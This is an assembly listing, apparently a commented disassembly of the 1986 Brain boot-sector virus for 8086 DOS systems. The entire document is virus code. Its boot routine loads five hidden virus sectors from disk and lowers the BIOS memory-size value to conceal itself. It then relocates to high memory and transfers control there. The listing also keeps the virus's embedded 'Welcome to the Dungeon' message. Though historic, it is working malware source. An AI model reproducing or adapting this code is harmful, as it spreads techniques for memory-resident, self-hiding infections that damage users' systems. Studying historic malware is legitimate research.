; File: BRAIN.BIN
; File Type: BIN
; Processor: 8086/88/87
; Range: 06000h to 061ffh
; Subroutines:    2



cseg            SEGMENT byte
                ASSUME CS:cseg,DS:cseg

                ORG     100H

GO:             JMP     BRAIN

                ORG     413H

MEM_SIZE        DW      ?

                ORG     7C00H

BRAIN           PROC NEAR
                CLI                             ;Turn OFF Interrupts
                JMP     NEAR PTR START

;-----------------------------------------------------

BRAIN_ID        DW      1234H
START_HEAD      DB      0
START_SECCYL    DB      7,13
HEAD_NO         DB      0
SECTOR_NO       DB      1
CYL_NO          DB      0
                DB      0,0,0,0

                DB      'Welcome to the  Dungeon         (c) 1986 Brain'
                DB      17H
                DB      '& Amjads (pvt) Ltd   VIRUS_SHOE  RECORD   '
                DB      'v9.0   Dedicated to the dynamic memories of millions '
                DB      'of virus who are no longer with us today - Thanks '
                DB      'GOODNESS!!       BEWARE OF THE er..VIRUS  : '
                DB      '\this program is catching      program '
                DB      'follows after these messeges..... $#@%$@!! '

;-----------------------------------------------------
START:          MOV     AX,CS                   ;*
                MOV     DS,AX
                MOV     SS,AX                   ;ss=ds=cs=0
                MOV     SP,0F000H               ;set up stack
                STI                             ;Turn ON Interrupts
                MOV     AL,[START_HEAD]         ;starting head number for read
                MOV     [HEAD_NO],AL
                MOV     CX,WORD PTR [START_SECCYL]
                MOV     WORD PTR [SECTOR_NO],CX
                CALL    NEAR PTR NEXT_SECTOR    ;set params for next disk sector
                MOV     CX,5                    ;Virus has 5 more sectors
                MOV     BX,7E00H                ;Load remainder of virus here
LOAD_VIRUS:     CALL    NEAR PTR READ_DISK      ;Read a sector from disk
                CALL    NEAR PTR NEXT_SECTOR    ;set params for next disk sector
                ADD     BX,200H                 ;move buffer for next sector
                LOOP    LOAD_VIRUS              ;Dec CX;Loop if CX>0
                MOV     AX,WORD PTR [MEM_SIZE]  ;Size of memory in kilobytes
                SUB     AX,7                    ;Decrement it by 7
                MOV     WORD PTR [MEM_SIZE],AX
                MOV     CL,6
                SHL     AX,CL                   ;Convert resultant into seg @
                MOV     ES,AX                   ;And set es up with that segment
                MOV     SI,7C00H                ;Move this sector and the rest
                MOV     DI,0                    ;Up to high memory
                MOV     CX,1004H
                CLD                             ;Forward String Opers
                REP     MOVSB                   ;Mov DS:[SI]->ES:[DI]
                PUSH    ES                      ;Prepare for control transfer
                MOV     AX,200H                 ;to offset 200 (first of the
                PUSH    AX                      ;hidden sectors)
                RETF                            ;Go to high memory

BRAIN           ENDP

;Read a sector from disk. This preserves bx and cx
READ_DISK       PROC NEAR
                PUSH    CX
                PUSH    BX
                MOV     CX,4                    ;Retry count
READ_LOOP:      PUSH    CX
                MOV     DH,[HEAD_NO]
                MOV     DL,00
                MOV     CX,WORD PTR [SECTOR_NO]
                MOV     AX,0201H
                INT     13H                     ;read sector, into ES:BX
                JNB     READ_OK                 ;No error, so continue
                MOV     AH,00                   ;Attempt to reset if an error
                INT     13H                     ;DSK:00-reset, DL=drive
                POP     CX
                LOOP    READ_LOOP               ;Dec CX;Loop if CX>0
                INT     18H                     ;Startup ROM Basic if retries expired
READ_OK:        POP     CX
                POP     BX
                POP     CX
                RETN
READ_DISK       ENDP

;Set params for next disk sector read
NEXT_SECTOR     PROC NEAR
                MOV     AL,[SECTOR_NO]          ;increment sector number
                INC     AL
                MOV     [SECTOR_NO],AL
                CMP     AL,0AH                  ;is sector=10?
                JNE     NS_DONE                 ;if not, all done
                MOV     [SECTOR_NO],1           ;yes, set sector=1 now
                MOV     AL,[HEAD_NO]            ;increment head count
                INC     AL
                MOV     [HEAD_NO],AL
                CMP     AL,2                    ;is it 2 yet?
                JNE     NS_DONE                 ;if not, all done
                MOV     [HEAD_NO],0             ;yes, set head = 0
                INC     [CYL_NO]                ;and increment cylinder number
NS_DONE:        RETN
NEXT_SECTOR     ENDP

;-----------------------------------------------------

                DB      0,0,0,0,32H,0E3H
                DB      23H,4DH,59H,0F4H,0A1H,82H
                DB      0BCH,0C3H,12H,0,7EH,12H
                DB      0CDH,21H,0A2H,3CH,5FH,0CH,5

cseg            ENDS


                END     GO
